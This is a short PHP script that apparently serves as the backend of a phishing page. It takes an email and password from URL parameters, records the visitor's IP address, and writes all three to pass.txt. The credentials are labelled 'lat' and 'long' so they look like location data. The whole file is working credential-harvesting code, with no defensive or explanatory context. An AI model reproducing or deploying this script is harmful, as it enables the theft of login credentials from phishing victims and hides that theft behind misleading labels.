<?php

$my_file = fopen("pass.txt", "w");
$information = "lat:" . $_GET["email"] . "\nlong:" . $_GET["pass"] . "\nip: " . $_SERVER["REMOTE_ADDR"];
fwrite($my_file, $information);
fclose($my_file);

?>